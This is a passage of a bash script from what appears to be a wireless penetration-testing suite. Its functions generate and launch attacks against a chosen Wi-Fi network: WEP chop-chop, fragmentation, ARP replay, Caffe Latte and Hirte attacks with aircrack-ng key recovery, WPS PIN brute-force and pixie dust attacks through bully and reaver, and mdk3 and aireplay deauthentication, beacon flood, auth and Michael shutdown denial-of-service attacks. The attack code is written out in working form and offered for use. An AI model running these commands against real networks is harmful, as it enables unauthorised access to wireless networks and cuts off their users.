		#!/usr/bin/env bash
		#shellcheck disable=SC1037
		#shellcheck disable=SC2164
		#shellcheck disable=SC2140
		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
		cd "${tmpdir}${wepdir}" > /dev/null 2>&1
	EOF

	cat >&6 <<-'EOF'
		#Execute wep chop-chop attack on its different phases
		function wep_chopchop_attack() {

			case ${wep_chopchop_phase} in
				1)
	EOF

	cat >&6 <<-EOF
					if grep "Now you can build a packet" "${tmpdir}${wepdir}chopchop_output.txt" > /dev/null 2>&1; then
	EOF

	cat >&6 <<-'EOF'
						wep_chopchop_phase=2
					else
						wep_chopchop_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase1_pid}$" 2> /dev/null)
						if [[ ${wep_chopchop_launched} -eq 0 ]] || [ -z "${wep_chopchop_phase1_pid_alive}" ]; then
							wep_chopchop_launched=1
	EOF

	cat >&6 <<-EOF
							xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (1/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}chopchop_output.txt\"" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
							wep_chopchop_phase1_pid=$!
							wep_script_processes+=(${wep_chopchop_phase1_pid})
						fi
					fi
				;;
				2)
	EOF

	cat >&6 <<-EOF
					xterm -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}replay_dec-\"*.xor -w \"${tmpdir}${wepdir}chopchop.cap\"" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
					wep_chopchop_phase2_pid=$!
					wep_script_processes+=(${wep_chopchop_phase2_pid})
					wep_chopchop_phase=3
				;;
				3)
					wep_chopchop_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_chopchop_phase2_pid}$" 2> /dev/null)
					if [ -z "${wep_chopchop_phase2_pid_alive}" ]; then
	EOF

	cat >&6 <<-EOF
						xterm -hold -bg black -fg brown -geometry "${g5_left7}" -T "Chop-Chop Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}chopchop.cap\" ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
						wep_script_processes+=($!)
						wep_chopchop_phase=4
					fi
				;;
			esac
			write_wep_processes
		}
	EOF

	cat >&6 <<-EOF
		#Execute wep fragmentation attack on its different phases
		function wep_fragmentation_attack() {
	EOF

	cat >&6 <<-'EOF'
			case ${wep_fragmentation_phase} in
				1)
	EOF

	cat >&6 <<-EOF
					if grep "Now you can build a packet" "${tmpdir}${wepdir}fragmentation_output.txt" > /dev/null 2>&1; then
	EOF

	cat >&6 <<-'EOF'
						wep_fragmentation_phase=2
					else
						wep_fragmentation_phase1_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase1_pid}$" 2> /dev/null)
						if [[ ${wep_fragmentation_launched} -eq 0 ]] || [ -z "${wep_fragmentation_phase1_pid_alive}" ]; then
							wep_fragmentation_launched=1
	EOF

	cat >&6 <<-EOF
							xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (1/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface} | tee -a \"${tmpdir}${wepdir}fragmentation_output.txt\"" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
							wep_fragmentation_phase1_pid=$!
							wep_script_processes+=(${wep_fragmentation_phase1_pid})
						fi
					fi
				;;
				2)
	EOF

	cat >&6 <<-EOF
					xterm -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (2/3)" -e "packetforge-ng -0 -a ${bssid} -h ${current_mac} -k 255.255.255.255 -l 255.255.255.255 -y \"${tmpdir}${wepdir}fragment-\"*.xor -w \"${tmpdir}${wepdir}fragmentation.cap\"" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
					wep_fragmentation_phase2_pid=$!
					wep_script_processes+=(${wep_fragmentation_phase2_pid})
					wep_fragmentation_phase=3
				;;
				3)
					wep_fragmentation_phase2_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fragmentation_phase2_pid}$" 2> /dev/null)
					if [ -z "${wep_fragmentation_phase2_pid_alive}" ]; then
	EOF

	cat >&6 <<-EOF
						xterm -hold -bg black -fg blue -geometry "${g5_left6}" -T "Fragmentation Attack (3/3)" -e "yes | aireplay-ng -2 -F -r \"${tmpdir}${wepdir}fragmentation.cap\" ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
						wep_script_processes+=($!)
						wep_fragmentation_phase=4
					fi
				;;
			esac
			write_wep_processes
		}

		#Write on a file the id of the WEP attack processes
		function write_wep_processes() {
	EOF

	cat >&6 <<-EOF
			if [ ! -f "${tmpdir}${wepdir}${wep_processes_file}" ]; then
				touch "${tmpdir}${wepdir}${wep_processes_file}" > /dev/null 2>&1
			fi
			path_to_process_file="${tmpdir}${wepdir}${wep_processes_file}"
	EOF

	cat >&6 <<-'EOF'
			for item in "${wep_script_processes[@]}"; do
				grep -E "^${item}$" "${path_to_process_file}" > /dev/null 2>&1
	EOF

	cat >&6 <<-'EOF'
				if [ "$?" != "0" ]; then
					echo "${item}" >>\
	EOF

	cat >&6 <<-EOF
					"${tmpdir}${wepdir}${wep_processes_file}"
				fi
			done
		}

		wep_script_processes=()
		xterm -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} -w \"${tmpdir}${wep_data}\" ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
		wep_script_capture_pid=$!
		wep_script_processes+=(${wep_script_capture_pid})
		write_wep_processes
	EOF

	cat >&6 <<-EOF
		wep_to_be_launched_only_once=0
		wep_fakeauth_pid=""
		wep_aircrack_launched=0
		current_ivs=0
		wep_chopchop_launched=0
		wep_chopchop_phase=1
		wep_fragmentation_launched=0
		wep_fragmentation_phase=1
	EOF

	cat >&6 <<-'EOF'
		while true; do
			wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_script_capture_pid}$" 2> /dev/null)
			wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_fakeauth_pid}$" 2> /dev/null)

			if [[ -n ${wep_capture_pid_alive} ]] && [[ -z ${wep_fakeauth_pid_alive} ]]; then
	EOF

	cat >&6 <<-EOF
				xterm -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
				wep_fakeauth_pid=$!
				wep_script_processes+=(${wep_fakeauth_pid})
				write_wep_processes
				sleep 2
			fi

			if [ ${wep_to_be_launched_only_once} -eq 0 ]; then
				wep_to_be_launched_only_once=1
	EOF

	cat >&6 <<-EOF
				xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Arp Broadcast Injection" -e "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
				wep_script_processes+=($!)
	EOF

	cat >&6 <<-EOF
				xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
				wep_script_processes+=($!)
	EOF

	cat >&6 <<-EOF
				xterm -hold -bg black -fg pink -geometry "${g5_left4}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
				wep_script_processes+=($!)
	EOF

	cat >&6 <<-EOF
				xterm -hold -bg black -fg grey -geometry "${g5_left5}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
				wep_script_processes+=($!)
				write_wep_processes
			fi

			if [ ${wep_fragmentation_phase} -lt 4 ]; then
				wep_fragmentation_attack
			fi

			if [ ${wep_chopchop_phase} -lt 4 ]; then
				wep_chopchop_attack
			fi
	EOF

	cat >&6 <<-EOF
			ivs_cmd="grep WEP ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 "
	EOF

	cat >&6 <<-'EOF'
			ivs_cmd+="| awk '{print \$11}' FS=',' | sed 's/ //g'"

			current_ivs=$(eval "${ivs_cmd}")
			if [[ ${current_ivs} -ge 5000 ]] && [[ ${wep_aircrack_launched} -eq 0 ]]; then
				wep_aircrack_launched=1
	EOF

	cat >&6 <<-EOF
				xterm -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" > /dev/null 2>&1 &
	EOF

	cat >&6 <<-'EOF'
				wep_aircrack_pid=$!
				wep_script_processes+=(${wep_aircrack_pid})
				write_wep_processes
			fi

			wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep -E "^${wep_aircrack_pid}$" 2> /dev/null)
			if [[ -z "${wep_aircrack_pid_alive}" ]] && [[ ${wep_aircrack_launched} -eq 1 ]]; then
				break
			elif [[ -z "${wep_capture_pid_alive}" ]]; then
				break
			fi
		done
	EOF
}

#Execute wps custom pin bully attack
function exec_wps_custom_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute wps custom pin reaver attack
function exec_wps_custom_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "custompin"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute bully pixie dust attack
function exec_bully_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute reaver pixie dust attack
function exec_reaver_pixiewps_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "pixiedust"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver pixie dust attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute wps bruteforce pin bully attack
function exec_wps_bruteforce_pin_bully_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "bully" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute wps bruteforce pin reaver attack
function exec_wps_bruteforce_pin_reaver_attack() {

	debug_print

	echo
	language_strings "${language}" 32 "green"

	set_wps_attack_script "reaver" "bruteforce"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 366 "blue"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS bruteforce pin reaver attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute wps pin database bully attack
function exec_wps_pin_database_bully_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "bully" "pindb"

	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS bully known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute wps pin database reaver attack
function exec_wps_pin_database_reaver_attack() {

	debug_print

	wps_pin_database_prerequisites

	set_wps_attack_script "reaver" "pindb"

	recalculate_windows_sizes
	xterm -hold -bg black -fg red -geometry "${g2_stdright_window}" -T "WPS reaver known pins database based attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
}

#Execute mdk3 deauth DoS attack
function exec_mdk3deauth() {

	debug_print

	echo
	language_strings "${language}" 89 "title"
	language_strings "${language}" 32 "green"

	tmpfiles_toclean=1
	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	echo "${bssid}" > "${tmpdir}bl.txt"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "mdk3 amok attack" -e mdk3 "${interface}" d -b "${tmpdir}bl.txt" -c "${channel}" > /dev/null 2>&1
}

#Execute aireplay DoS attack
function exec_aireplaydeauth() {

	debug_print

	echo
	language_strings "${language}" 90 "title"
	language_strings "${language}" 32 "green"

	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1
}

#Execute WDS confusion DoS attack
function exec_wdsconfusion() {

	debug_print

	echo
	language_strings "${language}" 91 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
}

#Execute Beacon flood DoS attack
function exec_beaconflood() {

	debug_print

	echo
	language_strings "${language}" 92 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "beacon flood attack" -e mdk3 "${interface}" b -n "${essid}" -c "${channel}" -s 1000 -h > /dev/null 2>&1
}

#Execute Auth DoS attack
function exec_authdos() {

	debug_print

	echo
	language_strings "${language}" 93 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "auth dos attack" -e mdk3 "${interface}" a -a "${bssid}" -m -s 1024 > /dev/null 2>&1
}

#Execute Michael Shutdown DoS attack
function exec_michaelshutdown() {

	debug_print

	echo
	language_strings "${language}" 94 "title"
	language_strings "${language}" 32 "green"

	echo
	language_strings "${language}" 33 "yellow"
	language_strings "${language}" 4 "read"
	recalculate_windows_sizes
	xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk3 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
}

#Validate Mdk3 parameters
function mdk3_deauth_option() {

	debug_print

	echo
	language_strings "${language}" 95 "title"
	language_strings "${language}" 35 "green"

	if ! check_monitor_enabled; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi
	ask_channel
	exec_mdk3deauth
}

#Validate Aireplay parameters
function aireplay_deauth_option() {

	debug_print

	echo
	language_strings "${language}" 96 "title"
	language_strings "${language}" 36 "green"

	if ! check_monitor_enabled; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi
	ask_channel
	exec_aireplaydeauth
}

#Validate WDS confusion parameters
function wds_confusion_option() {

	debug_print

	echo
	language_strings "${language}" 97 "title"
	language_strings "${language}" 37 "green"

	if ! check_monitor_enabled; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_essid "verify"; then
		return
	fi
	ask_channel
	exec_wdsconfusion
}

#Validate Beacon flood parameters
function beacon_flood_option() {

	debug_print

	echo
	language_strings "${language}" 98 "title"
	language_strings "${language}" 38 "green"

	if ! check_monitor_enabled; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_essid "verify"; then
		return
	fi
	ask_channel
	exec_beaconflood
}

#Validate Auth DoS parameters
function auth_dos_option() {

	debug_print

	echo
	language_strings "${language}" 99 "title"
	language_strings "${language}" 39 "green"

	if ! check_monitor_enabled; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi
	exec_authdos
}

#Validate Michael Shutdown parameters
function michael_shutdown_option() {

	debug_print

	echo
	language_strings "${language}" 100 "title"
	language_strings "${language}" 40 "green"

	if ! check_monitor_enabled; then
		return
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid; then
		return
	fi
	exec_michaelshutdown
}

#Validate wep all-in-one attack parameters
function wep_option() {

	debug_print

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "${essid}" = "(Hidden Network)" ]]; then
		echo
		language_strings "${language}" 125 "yellow"
		language_strings "${language}" 115 "read"
		if ! explore_for_targets_option; then
			return 1
		fi
	fi

	if ! check_monitor_enabled; then
		return 1
	fi

	if ! validate_network_encryption_type "WEP"; then
		return 1
	fi

	echo
	language_strings "${language}" 425 "yellow"
	language_strings "${language}" 115 "read"

	manage_wep_log
	language_strings "${language}" 115 "read"

	exec_wep_allinone_attack
}

#Validate wps parameters for custom pin, pixie dust, bruteforce and pin database attacks
function wps_attacks_parameters() {

	debug_print

	if ! check_monitor_enabled; then
		return 1
	fi

	echo
	language_strings "${language}" 34 "yellow"

	if ! ask_bssid "wps"; then
		return 1
	fi
	ask_channel "wps"

	case ${wps_attack} in
		"custompin_bully"|"custompin_reaver")
			ask_custom_pin
			ask_wps_timeout "standard"
		;;
		"pixiedust_bully"|"pixiedust_reaver")
			ask_wps_timeout "pixiedust"
		;;
		"pindb_bully"|"pindb_reaver")
			ask_wps_timeout "standard"
		;;
	esac

	return 0
}

#Print selected options
function print_options() {

	debug_print

	if [ "${auto_update}" -eq 1 ]; then
		language_strings "${language}" 451 "blue"
	else
		language_strings "${language}" 452 "blue"
	fi

	if [ "${allow_colorization}" -eq 1 ]; then
		language_strings "${language}" 453 "blue"
	else
		language_strings "${language}" 454 "blue"
	fi

	if [ "${auto_change_language}" -eq 1 ]; then
		language_strings "${language}" 474 "blue"
	else
		language_strings "${language}" 475 "blue"
	fi
}

#Print selected interface
function print_iface_selected() {

	debug_print

	if [ -z "${interface}" ]; then
		language_strings "${language}" 41 "red"
		echo
		language_strings "${language}" 115 "read"
		select_interface
	else
		check_interface_mode
		language_strings "${language}" 42 "blue"
	fi
}

#Print selected internet interface
function print_iface_internet_selected() {

	debug_print

	if [[ "${et_mode}" != "et_captive_portal" ]] || [[ ${captive_portal_mode} = "internet" ]]; then
		if [ -z "${internet_interface}" ]; then
			language_strings "${language}" 283 "blue"
		else
			language_strings "${language}" 282 "blue"
		fi
	fi
}

#Print selected target parameters (bssid, channel, essid and type of encryption)
function print_all_target_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
		if [ -n "${channel}" ]; then
			language_strings "${language}" 44 "blue"
		fi
		if [ -n "${essid}" ]; then
			if [ "${essid}" = "(Hidden Network)" ]; then
				language_strings "${language}" 45 "blue"
			else
				language_strings "${language}" 46 "blue"
			fi
		fi
		if [ -n "${enc}" ]; then
			language_strings "${language}" 135 "blue"
		fi
	fi
}

#Print selected target parameters on evil twin menu (bssid, channel and essid)
function print_all_target_vars_et() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi
}

#Print selected target parameters on evil twin submenus (bssid, channel, essid, DoS type and Handshake file)
function print_et_target_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 271 "blue"
	fi

	if [ -n "${channel}" ]; then
		language_strings "${language}" 44 "blue"
	else
		language_strings "${language}" 273 "blue"
	fi

	if [ -n "${essid}" ]; then
		if [ "${essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 45 "blue"
		else
			language_strings "${language}" 46 "blue"
		fi
	else
		language_strings "${language}" 274 "blue"
	fi

	if [ "${current_menu}" != "et_dos_menu" ]; then
		if [ -n "${et_dos_attack}" ]; then
			language_strings "${language}" 272 "blue"
		else
			language_strings "${language}" 278 "blue"
		fi
	fi

	if [ "${et_mode}" = "et_captive_portal" ]; then
		if [ -n "${et_handshake}" ]; then
			language_strings "${language}" 311 "blue"
		else
			if [ -n "${enteredpath}" ]; then
				language_strings "${language}" 314 "blue"
			else
				language_strings "${language}" 310 "blue"
			fi
		fi
	fi
}

#Print selected target parameters on wps attacks menu (bssid, channel and essid)
function print_all_target_vars_wps() {

	debug_print

	if [ -n "${wps_bssid}" ]; then
		language_strings "${language}" 335 "blue"
	else
		language_strings "${language}" 339 "blue"
	fi

	if [ -n "${wps_channel}" ]; then
		language_strings "${language}" 336 "blue"
	else
		language_strings "${language}" 340 "blue"
	fi

	if [ -n "${wps_essid}" ]; then
		if [ "${wps_essid}" = "(Hidden Network)" ]; then
			language_strings "${language}" 337 "blue"
		else
			language_strings "${language}" 338 "blue"
		fi
	else
		language_strings "${language}" 341 "blue"
	fi

	if [ -n "${wps_locked}" ]; then
		language_strings "${language}" 351 "blue"
	else
		language_strings "${language}" 352 "blue"
	fi
}

#Print selected target parameters on decrypt menu (bssid, Handshake file, dictionary file and rules file)
function print_decrypt_vars() {

	debug_print

	if [ -n "${bssid}" ]; then
		language_strings "${language}" 43 "blue"
	else
		language_strings "${language}" 185 "blue"
	fi

	if [ -n "${enteredpath}" ]; then
		language_strings "${language}" 173 "blue"
	else
		language_strings "${language}" 177 "blue"
	fi

	if [ -n "${DICTIONARY}" ]; then
		language_strings "${language}" 182 "blue"
	fi

	if [ -n "${RULES}" ]; then
		language_strings "${language}" 243 "blue"
	fi
}

#Create the dependencies arrays
function initialize_menu_options_dependencies() {

	debug_print

	clean_handshake_dependencies=(${optional_tools_names[0]})
	aircrack_attacks_dependencies=(${optional_tools_names[1]})
	aireplay_attack_dependencies=(${optional_tools_names[2]})
	mdk3_attack_dependencies=(${optional_tools_names[3]})
	hashcat_attacks_dependencies=(${optional_tools_names[4]})
	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
	et_sniffing_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]})
	et_sniffing_sslstrip_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[8]} ${optional_tools_names[9]} ${optional_tools_names[10]})
	et_captive_portal_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[11]})
	wash_scan_dependencies=(${optional_tools_names[13]})
	reaver_attacks_dependencies=(${optional_tools_names[14]})
	bully_attacks_dependencies=(${optional_tools_names[15]} ${optional_tools_names[17]})
	bully_pixie_dust_attack_dependencies=(${optional_tools_names[15]} ${optional_tools_names[16]} ${optional_tools_names[17]})
	reaver_pixie_dust_attack_dependencies=(${optional_tools_names[14]} ${optional_tools_names[16]})
	et_sniffing_sslstrip2_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]} ${optional_tools_names[18]} ${optional_tools_names[19]})
	wep_attack_dependencies=(${optional_tools_names[2]} ${optional_tools_names[20]})
}

#Set possible changes for some commands that can be found in different ways depending of the O.S.
function set_possible_aliases() {

	debug_print

	for item in "${!possible_alias_names[@]}"; do
		if ! hash "${item}" 2> /dev/null || [[ "${item}" = "beef" ]]; then
			arraliases=(${possible_alias_names[${item//[[:space:]]/ }]})
			for item2 in "${arraliases[@]}"; do
				if hash "${item2}" 2> /dev/null; then
					optional_tools_names=(${optional_tools_names[@]/${item}/${item2}})
					break
				fi
			done
		fi
	done
}

#Initialize optional_tools values
function initialize_optional_tools_values() {

	debug_print

	declare -gA optional_tools

	for item in "${optional_tools_names[@]}"; do
		optional_tools[${item}]=0
	done
}

#Set some vars depending of the menu and invoke the printing of target vars
function initialize_menu_and_print_selections() {

	debug_print

	forbidden_options=()

	case ${current_menu} in
		"main_menu")
			print_iface_selected
		;;
		"decrypt_menu")
			print_decrypt_vars
		;;
		"handshake_tools_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"dos_attacks_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"attack_handshake_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"language_menu")
			print_iface_selected
		;;
		"evil_twin_attacks_menu")
			return_to_et_main_menu=0
			retry_handshake_capture=0
			return_to_et_main_menu_from_beef=0
			retrying_handshake_capture=0
			internet_interface_selected=0
			captive_portal_mode="internet"
			et_mode=""
			et_processes=()
			print_iface_selected
			print_all_target_vars_et
		;;
		"et_dos_menu")
			if [ ${retry_handshake_capture} -eq 1 ]; then
				retry_handshake_capture=0
				retrying_handshake_capture=1
			fi
			print_iface_selected
			print_et_target_vars
			print_iface_internet_selected
		;;
		"wps_attacks_menu")
			print_iface_selected
			print_all_target_vars_wps
		;;
		"wep_attacks_menu")
			print_iface_selected
			print_all_target_vars
		;;
		"beef_pre_menu")
			print_iface_selected
			print_all_target_vars_et
		;;
		"option_menu")
			print_options
		;;
		*)
			print_iface_selected
			print_all_target_vars
		;;
	esac
}

#Clean temporary files
function clean_tmpfiles() {

	debug_print

	rm -rf "${tmpdir}bl.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}handshake"* > /dev/null 2>&1
	rm -rf "${tmpdir}nws"* > /dev/null 2>&1
	rm -rf "${tmpdir}clts"* > /dev/null 2>&1
	rm -rf "${tmpdir}wnws.txt" > /dev/null 2>&1
	rm -rf "${tmpdir}hctmp"* > /dev/null 2>&1
	rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
	rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${dhcpd_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${control_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
	if [ "${beef_found}" -eq 1 ]; then
		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
	fi
	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
	if [ "${dhcpd_path_changed}" -eq 1 ]; then
		rm -rf "${dhcp_path}" > /dev/null 2>&1
	fi
	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
}

#Manage cleaning firewall rules and restore orginal routing state
function clean_routing_rules() {

	debug_print

	if [ -n "${original_routing_state}" ]; then
		echo "${original_routing_state}" > /proc/sys/net/ipv4/ip_forward
	fi

	if [ "${iptables_saved}" -eq 1 ]; then
		restore_iptables
	else
		clean_iptables
	fi
}

#Save iptables rules
function save_iptables() {

	debug_print

	if iptables-save > "${tmpdir}ag.iptables" 2> /dev/null; then
		iptables_saved=1
	fi
}

#Restore iptables rules
function restore_iptables() {

	debug_print

	iptables-restore < "${tmpdir}ag.iptables" 2> /dev/null
}

#Clean iptables rules
function clean_iptables() {

	debug_print

	iptables -F
	iptables -t nat -F
	iptables -X
	iptables -t nat -X
}

#Create an array from parameters
